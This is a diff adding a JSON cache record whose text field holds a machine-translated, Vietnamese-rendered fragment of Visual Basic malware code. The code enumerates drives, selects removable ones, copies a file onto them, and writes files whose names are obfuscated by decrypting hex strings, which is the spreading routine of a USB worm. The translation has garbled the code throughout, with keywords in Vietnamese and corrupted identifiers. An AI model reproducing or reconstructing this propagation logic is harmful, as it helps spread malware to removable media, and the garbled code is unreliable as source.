@@ -1,0 +1,5 @@
+{
+  "cache_key": "f0152b68d0dc99c3295b",
+  "provider_request_id": null,
+  "text": "N\u1ed9i dung: ch\u1ee9c n\u0103ng c\u00f4ng c\u1ed9ng SubExFloods(Filename As String, Hide As Boolean) As Long Dim szBuffer As String * 128 Dim Drive As Variant Dim Drives() As String hGet = GetLogicalDriveStrings(Len(szBuffer), szBuffer) N\u1ebfu hGet <> 0 Sau \u0111\u00f3 l\u00e0 \u1ed5 \u0111\u0129a = Split(szBuffer, Chr(0)) \u0110\u1ed1i v\u1edbi m\u1ed7i \u1ed5 \u0111\u0129a trong \u1ed5 \u0111\u0129a N\u1ebfu GetDriveTypeDrive) = DRIVE_REMOVABLE Sau \u0111\u00f3 l\u1ea5y n\u1ebfu CopyToFile sau \u0111\u00f3FileOfAttilename, True Drive & Fileename) = True If WriteToFileFileFileDrive & Desencriptar\"61757Fib72E275E666\"), _ DesencriptExExabytes\"5B61757Fib76E672E6E5"
+}
